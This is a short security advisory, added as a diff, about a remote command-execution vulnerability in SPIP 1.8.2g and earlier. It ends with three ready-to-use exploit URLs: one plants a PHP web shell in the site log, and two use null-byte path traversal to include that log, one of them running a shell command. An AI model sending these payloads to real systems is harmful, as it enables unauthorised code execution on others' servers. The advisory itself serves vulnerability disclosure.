@@ -1,0 +1,14 @@
+source: http://www.securityfocus.com/bid/16556/info
+
+SPIP is prone to a remote command-execution vulnerability. This is due to a lack of proper sanitization of user-supplied input.
+
+An attacker can exploit this issue to execute arbitrary remote PHP commands on an affected computer with the privileges of the webserver process.
+
+Successful exploitation could facilitate unauthorized access; other attacks are also possible.
+
+Version 1.8.2g and earlier are vulnerable; other versions may also be affected.
+
+http://www.example.com/spip_rss.php?GLOBALS[type_urls]=/../ecrire/data/spip.log%00
+
+http://www.example.com/spip_acces_doc.php3?id_document=0&file=<?system($_GET[cmd]);?>
+http://www.example.com/spip_rss.php?cmd=ls%20-la&GLOBALS[type_urls]=/../ecrire/data/spip.log%00 
